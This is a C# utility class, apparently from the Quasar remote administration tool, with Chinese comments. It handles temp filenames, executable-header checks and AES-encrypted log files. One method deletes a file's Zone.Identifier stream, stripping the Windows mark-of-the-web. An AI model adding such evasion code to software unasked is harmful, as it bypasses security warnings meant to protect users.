using Quasar.Common.Cryptography;
using System.IO;
using System.Linq;
using System.Text;

namespace Quasar.Common.Helpers
{
    public static class FileHelper
    {
        /// <summary>
        /// 非法路径字符的列表。
        /// </summary>
        private static readonly char[] IllegalPathChars = Path.GetInvalidPathChars().Union(Path.GetInvalidFileNameChars()).ToArray();

        /// <summary>
        /// 指示给定路径是否包含非法字符。
        /// </summary>
        /// <param name="path">要检查的路径。</param>
        /// <returns>Returns <value>true</value> 如果路径中含有非法字符，则为 <value>false</value>.</returns>
        public static bool HasIllegalCharacters(string path)
        {
            return path.Any(c => IllegalPathChars.Contains(c));
        }

        /// <summary>
        /// 获取一个随机的文件名。
        /// </summary>
        /// <param name="length">文件名的长度。</param>
        /// <param name="extension">包括点的文件扩展名，例如：<value>.exe</value>.</param>
        /// <returns>随机文件名。</returns>
        public static string GetRandomFilename(int length, string extension = "")
        {
            return string.Concat(StringHelper.GetRandomString(length), extension);
        }

        /// <summary>
        /// 获取一个未使用的临时文件的路径。
        /// </summary>
        /// <param name="extension">包括点的文件扩展名，例如：<value>.exe</value>.</param>
        /// <returns>到临时文件的路径。</returns>
        public static string GetTempFilePath(string extension)
        {
            string tempFilePath;
            do
            {
                tempFilePath = Path.Combine(Path.GetTempPath(), GetRandomFilename(12, extension));
            } while (File.Exists(tempFilePath));

            return tempFilePath;
        }

        /// <summary>
        /// 指示给定的文件头是否包含可执行标识符（神奇数字）'MZ'。
        /// </summary>
        /// <param name="binary">要检查的二进制文件。</param>
        /// <returns>Returns <value>true</value> 为有效的可执行标识符，否则 <value>false</value>.</returns>
        public static bool HasExecutableIdentifier(byte[] binary)
        {
            if (binary.Length < 2) return false;
            return (binary[0] == 'M' && binary[1] == 'Z') || (binary[0] == 'Z' && binary[1] == 'M');
        }

        /// <summary>
        /// 删除给定文件路径的区域标识符。
        /// </summary>
        /// <param name="filePath">文件路径。</param>
        /// <returns>Returns <value>true</value> 如果删除成功，否则 <value>false</value>.</returns>
        public static bool DeleteZoneIdentifier(string filePath)
        {
            return NativeMethods.DeleteFile(filePath + ":Zone.Identifier");
        }

        /// <summary>
        /// 将文本添加到一个日志文件。
        /// </summary>
        /// <param name="filename">日志的文件名。</param>
        /// <param name="appendText">要附加的文本。</param>
        /// <param name="aes">AES实例。</param>
        public static void WriteLogFile(string filename, string appendText, Aes256 aes)
        {
            appendText = ReadLogFile(filename, aes) + appendText;

            using (FileStream fStream = File.Open(filename, FileMode.Create, FileAccess.Write))
            {
                byte[] data = aes.Encrypt(Encoding.UTF8.GetBytes(appendText));
                fStream.Seek(0, SeekOrigin.Begin);
                fStream.Write(data, 0, data.Length);
            }
        }

        /// <summary>
        /// 读取一个日志文件。
        /// </summary>
        /// <param name="filename">日志的文件名。</param>
        /// <param name="aes">AES实例。</param>
        public static string ReadLogFile(string filename, Aes256 aes)
        {
            return File.Exists(filename) ? Encoding.UTF8.GetString(aes.Decrypt(File.ReadAllBytes(filename))) : string.Empty;
        }
    }
}
